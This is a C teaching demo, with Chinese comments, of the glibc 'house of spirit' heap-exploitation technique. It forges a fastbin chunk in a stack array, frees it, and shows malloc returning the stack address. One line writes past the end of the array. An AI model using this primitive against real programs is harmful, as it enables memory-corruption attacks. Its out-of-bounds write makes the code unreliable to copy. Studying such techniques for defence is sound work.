#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "这个例子演示了 house of spirit 攻击\n");

    fprintf(stderr, "我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n");
    malloc(1);

    fprintf(stderr, "覆盖一个指向 fastbin 的指针\n");
    unsigned long long *a, *b;
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);

    fprintf(stderr, "构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n");
    fake_chunks[1] = 0x40; // size

    fprintf(stderr, "next chunk 的大小也要注意，要大于 0x10 小于 av->system_mem（128kb）\n");
        // 这是fake_chunks[?]可以数一下
    fake_chunks[9] = 0x1234; // nextsize
    fake_chunks[2] = 0x4141414141414141LL;
    fake_chunks[10] = 0x4141414141414141LL;

    fprintf(stderr, "现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n", &fake_chunks[2]);
    a = &fake_chunks[2];

    fprintf(stderr, "free!\n");
    free(a);

    fprintf(stderr, "现在 malloc 的时候将会把 %p 给返回回来\n", &fake_chunks[2]);
    b = malloc(0x30);
    fprintf(stderr, "malloc(0x30): %p\n", b);
    b[0] = 0x4242424242424242LL;
    fprintf(stderr, "ok!\n");
    return 0;
}
